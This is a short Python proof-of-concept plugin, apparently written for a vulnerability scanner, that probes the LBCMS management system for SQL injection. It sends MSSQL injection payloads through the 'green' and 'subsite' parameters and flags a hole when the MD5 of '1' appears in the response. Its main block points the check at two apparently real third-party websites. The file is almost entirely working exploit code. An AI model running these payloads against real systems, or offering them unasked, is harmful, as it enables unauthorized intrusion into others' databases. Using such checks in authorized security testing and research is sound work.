#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:LBCMS管理系统SQL注入漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0121366，http://www.wooyun.org/bugs/wooyun-2010-0122653


def assign(service,arg):
    if service=="lbcms":
        return True,arg 


def  audit(arg):
    url=arg+"Webwsfw/bssh/?green=1%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))>0--"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)
    url=arg+"Webwsfw/bssh/?subsite=1%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))>0--"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)
if __name__=="__main__":
    from dummy import *
    audit(assign('lbcms','http://www.baiweiled.com/')[1])
    audit(assign('lbcms','http://www.jzpsy.cn/')[1])